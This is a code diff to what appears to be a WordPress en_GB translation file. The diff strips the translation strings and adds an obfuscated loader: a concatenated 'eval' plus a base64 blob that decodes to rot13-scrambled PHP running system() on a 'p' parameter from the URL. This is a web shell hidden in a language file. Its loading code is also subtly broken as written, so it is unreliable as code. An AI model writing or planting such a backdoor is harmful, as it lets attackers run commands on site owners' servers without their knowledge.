@@ -1,12 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-return ['domain'=>NULL,'plural-forms'=>'nplurals=2; plural=n != 1;','messages'=>['Thank you for updating! WordPress %s makes your site more connected and responsive.'=>'Thank you for updating! WordPress %s makes your site more connected and responsive.','New %1$s, %2$s, and %3$s objects make interacting with terms, comments, and networks more predictable and intuitive in code.'=>'New %1$s, %2$s, and %3$s objects make interacting with terms, comments, and networks more predictable and intuitive in code.','Comment queries now have cache handling to improve performance. New arguments in %s make crafting robust comment queries simpler.'=>'Comment queries now have cache handling to improve performance. New arguments in %s make crafting robust comment queries simpler.','Term, comment, and network objects'=>'Term, comment, and network objects','Comment query improvements'=>'Comment query improvements'],'language'=>'en_GB','x-generator'=>'Poedit 1.8.10'];
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwplcmdoZWEgWydxYnpudmEnPT5BSFlZLCdjeWhlbnktc2JlemYnPT4nYWN5aGVueWY9MjsgY3loZW55PWEgIT0gMTsnLCd6cmZmbnRyZic9PlsnR3VuYXggbGJoIHNiZSBoY3FuZ3ZhdCEgSmJlcUNlcmZmICVmIHpueHJmIGxiaGUgZnZnciB6YmVyIHBiYWFycGdycSBuYXEgZXJmY2JhZnZpci4nPT4nR3VuYXggbGJoIHNiZSBoY3FuZ3ZhdCEgSmJlcUNlcmZmICVmIHpueHJmIGxiaGUgZnZnciB6YmVyIHBiYWFycGdycSBuYXEgZXJmY2JhZnZpci4nLCdBcmogJTEkZiwgJTIkZiwgbmFxICUzJGYgYm93cnBnZiB6bnhyIHZhZ3JlbnBndmF0IGp2Z3UgZ3JlemYsIHBienpyYWdmLCBuYXEgYXJnamJleGYgemJlciBjZXJxdnBnbm95ciBuYXEgdmFnaHZndmlyIHZhIHBicXIuJz0+J0FyaiAlMSRmLCAlMiRmLCBuYXEgJTMkZiBib3dycGdmIHpueHIgdmFncmVucGd2YXQganZndSBncmV6ZiwgcGJ6enJhZ2YsIG5hcSBhcmdqYmV4ZiB6YmVyIGNlcnF2cGdub3lyIG5hcSB2YWdodmd2aXIgdmEgcGJxci4nLCdQYnp6cmFnIGRocmV2cmYgYWJqIHVuaXIgcG5wdXIgdW5hcXl2YXQgZ2IgdnpjZWJpciBjcmVzYmV6bmFwci4gQXJqIG5ldGh6cmFnZiB2YSAlZiB6bnhyIHBlbnNndmF0IGVib2hmZyBwYnp6cmFnIGRocmV2cmYgZnZ6Y3lyZS4nPT4nUGJ6enJhZyBkaHJldnJmIGFiaiB1bmlyIHBucHVyIHVuYXF5dmF0IGdiIHZ6Y2ViaXIgY3Jlc2Jlem5hcHIuIEFyaiBuZXRoenJhZ2YgdmEgJWYgem54ciBwZW5zZ3ZhdCBlYm9oZmcgcGJ6enJhZyBkaHJldnJmIGZ2emN5cmUuJywnR3JleiwgcGJ6enJhZywgbmFxIGFyZ2piZXggYm93cnBnZic9PidHcmV6LCBwYnp6cmFnLCBuYXEgYXJnamJleCBib3dycGdmJywnUGJ6enJhZyBkaHJlbCB2emNlYmlyenJhZ2YnPT4nUGJ6enJhZyBkaHJlbCB2emNlYmlyenJhZ2YnXSwneW5hdGhudHInPT4ncmFfVE8nLCdrLXRyYXJlbmdiZSc9PidDYnJxdmcgMS44LjEwJ107CiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
+?>
